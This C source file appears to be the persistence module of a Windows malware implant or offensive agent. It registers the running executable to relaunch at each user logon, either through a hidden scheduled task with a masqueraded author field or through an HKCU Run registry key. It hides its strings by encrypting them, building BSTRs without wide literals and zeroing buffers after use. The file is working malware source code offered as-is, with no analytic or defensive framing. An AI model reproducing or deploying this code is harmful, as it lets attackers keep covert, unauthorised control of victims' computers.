#define COBJMACROS
#define INITGUID

#include "persist.h"
#include "evs_strings.h"
#include <windows.h>
#include <ole2.h>
#include <taskschd.h>
#include <wchar.h>
#include <string.h>

static void _exe_path(char *buf, DWORD sz)
{
    GetModuleFileNameA(NULL, buf, sz);
}

/* Build BSTR from narrow string — avoids wide string literals in .rdata */
static BSTR _bstr_from_chars(const char *s)
{
    int n = (int)strlen(s);
    WCHAR *w = (WCHAR *)HeapAlloc(GetProcessHeap(), 0, (size_t)(n + 1) * sizeof(WCHAR));
    if (!w) return NULL;
    for (int i = 0; i < n; i++) w[i] = (WCHAR)(unsigned char)s[i];
    w[n] = L'\0';
    BSTR b = SysAllocString(w);
    HeapFree(GetProcessHeap(), 0, w);
    return b;
}

/* registry Run key persistence (HKCU, no elevation needed) */

static int _reg_install(const char *path)
{
    char _rk[46], _rv[23];
    EVS_D(_rk, EVS_str_reg_run_key);
    EVS_D(_rv, EVS_str_persist_reg_val);
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, _rk, 0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS) {
        SecureZeroMemory(_rk, sizeof(_rk));
        SecureZeroMemory(_rv, sizeof(_rv));
        return -1;
    }
    LONG rc = RegSetValueExA(hk, _rv, 0, REG_SZ,
        (const BYTE *)path, (DWORD)(strlen(path) + 1));
    RegCloseKey(hk);
    SecureZeroMemory(_rk, sizeof(_rk));
    SecureZeroMemory(_rv, sizeof(_rv));
    return rc == ERROR_SUCCESS ? 0 : -1;
}

static int _reg_remove(void)
{
    char _rk[46], _rv[23];
    EVS_D(_rk, EVS_str_reg_run_key);
    EVS_D(_rv, EVS_str_persist_reg_val);
    HKEY hk;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, _rk, 0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS) {
        SecureZeroMemory(_rk, sizeof(_rk));
        SecureZeroMemory(_rv, sizeof(_rv));
        return -1;
    }
    RegDeleteValueA(hk, _rv);
    RegCloseKey(hk);
    SecureZeroMemory(_rk, sizeof(_rk));
    SecureZeroMemory(_rv, sizeof(_rv));
    return 0;
}

static int _schtask_install(const char *exe_path)
{
    HRESULT hr;
    int rc = -1;

    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    BOOL need_uninit = (hr == S_OK || hr == S_FALSE);

    ITaskService *pSvc = NULL;
    hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                          &IID_ITaskService, (void **)&pSvc);
    if (FAILED(hr)) goto co_done;

    {
        VARIANT v; VariantInit(&v);
        if (FAILED(pSvc->lpVtbl->Connect(pSvc, v, v, v, v)))
            goto svc_done;
    }

    ITaskFolder *pFolder = NULL;
    {
        BSTR root = SysAllocString(L"\\");
        hr = pSvc->lpVtbl->GetFolder(pSvc, root, &pFolder);
        SysFreeString(root);
        if (FAILED(hr)) goto svc_done;
    }

    ITaskDefinition *pDef = NULL;
    if (FAILED(pSvc->lpVtbl->NewTask(pSvc, 0, &pDef)))
        goto folder_done;

/* author field for masquerading */
    {
        IRegistrationInfo *pi = NULL;
        if (SUCCEEDED(pDef->lpVtbl->get_RegistrationInfo(pDef, &pi))) {
            char _auth[22];
            EVS_D(_auth, EVS_str_persist_author);
            BSTR auth = _bstr_from_chars(_auth);
            SecureZeroMemory(_auth, sizeof(_auth));
            pi->lpVtbl->put_Author(pi, auth);
            SysFreeString(auth);
            pi->lpVtbl->Release(pi);
        }
    }

    /* principal: interactive token, no elevation */
    {
        IPrincipal *pp = NULL;
        if (SUCCEEDED(pDef->lpVtbl->get_Principal(pDef, &pp))) {
            pp->lpVtbl->put_LogonType(pp, TASK_LOGON_INTERACTIVE_TOKEN);
            pp->lpVtbl->Release(pp);
        }
    }

    /* settings: hidden, runs on battery, starts when available */
    {
        ITaskSettings *ps = NULL;
        if (SUCCEEDED(pDef->lpVtbl->get_Settings(pDef, &ps))) {
            ps->lpVtbl->put_Hidden(ps, VARIANT_TRUE);
            ps->lpVtbl->put_StartWhenAvailable(ps, VARIANT_TRUE);
            ps->lpVtbl->put_StopIfGoingOnBatteries(ps, VARIANT_FALSE);
            ps->lpVtbl->put_DisallowStartIfOnBatteries(ps, VARIANT_FALSE);
            ps->lpVtbl->Release(ps);
        }
    }

    /* logon trigger */
    {
        ITriggerCollection *ptc = NULL;
        if (SUCCEEDED(pDef->lpVtbl->get_Triggers(pDef, &ptc))) {
            ITrigger *pt = NULL;
            if (SUCCEEDED(ptc->lpVtbl->Create(ptc, TASK_TRIGGER_LOGON, &pt))) {
                ILogonTrigger *plt = NULL;
                if (SUCCEEDED(pt->lpVtbl->QueryInterface(pt,
                        &IID_ILogonTrigger, (void **)&plt))) {
                    char _tid[13];
                    EVS_D(_tid, EVS_str_persist_trigger_id);
                    BSTR id = _bstr_from_chars(_tid);
                    SecureZeroMemory(_tid, sizeof(_tid));
                    plt->lpVtbl->put_Id(plt, id);
                    SysFreeString(id);
                    plt->lpVtbl->Release(plt);
                }
                pt->lpVtbl->Release(pt);
            }
            ptc->lpVtbl->Release(ptc);
        }
    }

    /* exec action */
    {
        IActionCollection *pac = NULL;
        if (SUCCEEDED(pDef->lpVtbl->get_Actions(pDef, &pac))) {
            IAction *pa = NULL;
            if (SUCCEEDED(pac->lpVtbl->Create(pac, TASK_ACTION_EXEC, &pa))) {
                IExecAction *pea = NULL;
                if (SUCCEEDED(pa->lpVtbl->QueryInterface(pa,
                        &IID_IExecAction, (void **)&pea))) {
                    BSTR p = _bstr_from_chars(exe_path);
                    pea->lpVtbl->put_Path(pea, p);
                    SysFreeString(p);
                    pea->lpVtbl->Release(pea);
                }
                pa->lpVtbl->Release(pa);
            }
            pac->lpVtbl->Release(pac);
        }
    }

    /* register task */
    {
        char _tn[35];
        EVS_D(_tn, EVS_str_persist_task_name);
        BSTR name = _bstr_from_chars(_tn);
        SecureZeroMemory(_tn, sizeof(_tn));
        VARIANT ve; VariantInit(&ve);
        IRegisteredTask *preg = NULL;
        hr = pFolder->lpVtbl->RegisterTaskDefinition(pFolder, name, pDef,
            TASK_CREATE_OR_UPDATE, ve, ve,
            TASK_LOGON_INTERACTIVE_TOKEN, ve, &preg);
        SysFreeString(name);
        if (SUCCEEDED(hr)) {
            rc = 0;
            if (preg) preg->lpVtbl->Release(preg);
        }
    }

    pDef->lpVtbl->Release(pDef);
folder_done:
    pFolder->lpVtbl->Release(pFolder);
svc_done:
    pSvc->lpVtbl->Release(pSvc);
co_done:
    if (need_uninit) CoUninitialize();
    return rc;
}

static int _schtask_remove(void)
{
    HRESULT hr;
    int rc = -1;

    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    BOOL need_uninit = (hr == S_OK || hr == S_FALSE);

    ITaskService *pSvc = NULL;
    if (FAILED(CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                                &IID_ITaskService, (void **)&pSvc)))
        goto co_done2;

    {
        VARIANT v; VariantInit(&v);
        pSvc->lpVtbl->Connect(pSvc, v, v, v, v);
    }

    ITaskFolder *pFolder = NULL;
    {
        BSTR root = SysAllocString(L"\\");
        pSvc->lpVtbl->GetFolder(pSvc, root, &pFolder);
        SysFreeString(root);
    }

    if (pFolder) {
        char _tn[35];
        EVS_D(_tn, EVS_str_persist_task_name);
        BSTR name = _bstr_from_chars(_tn);
        SecureZeroMemory(_tn, sizeof(_tn));
        if (SUCCEEDED(pFolder->lpVtbl->DeleteTask(pFolder, name, 0)))
            rc = 0;
        SysFreeString(name);
        pFolder->lpVtbl->Release(pFolder);
    }

    pSvc->lpVtbl->Release(pSvc);
co_done2:
    if (need_uninit) CoUninitialize();
    return rc;
}

/* public API */

int persist_install(persist_method_t method)
{
    char path[MAX_PATH];
    _exe_path(path, MAX_PATH);
    return method == PERSIST_SCHTASK ? _schtask_install(path) : _reg_install(path);
}

int persist_remove(persist_method_t method)
{
    return method == PERSIST_SCHTASK ? _schtask_remove() : _reg_remove();
}

int persist_auto(void)
{
    char path[MAX_PATH];
    _exe_path(path, MAX_PATH);
    if (_schtask_install(path) == 0) return PERSIST_SCHTASK;
    if (_reg_install(path) == 0)    return PERSIST_REGISTRY;
    return -1;
}
